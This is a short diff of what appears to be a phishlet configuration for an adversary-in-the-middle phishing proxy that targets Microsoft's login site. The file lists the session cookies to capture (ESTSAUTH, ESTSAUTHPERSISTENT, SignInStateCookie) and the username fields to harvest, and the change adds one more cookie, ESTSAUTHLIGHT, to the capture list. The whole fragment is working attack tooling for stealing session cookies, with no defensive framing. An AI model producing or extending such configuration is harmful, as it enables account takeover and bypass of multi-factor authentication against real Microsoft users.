@@ -23,7 +23,7 @@ auth_tokens:
   - domain: '.login.microsoftonline.com'
     keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']
   - domain: 'login.microsoftonline.com'
-    keys: ['SignInStateCookie']
+    keys: ['ESTSAUTHLIGHT', 'SignInStateCookie']
 credentials:
   username:
     key: '(login|UserName)'
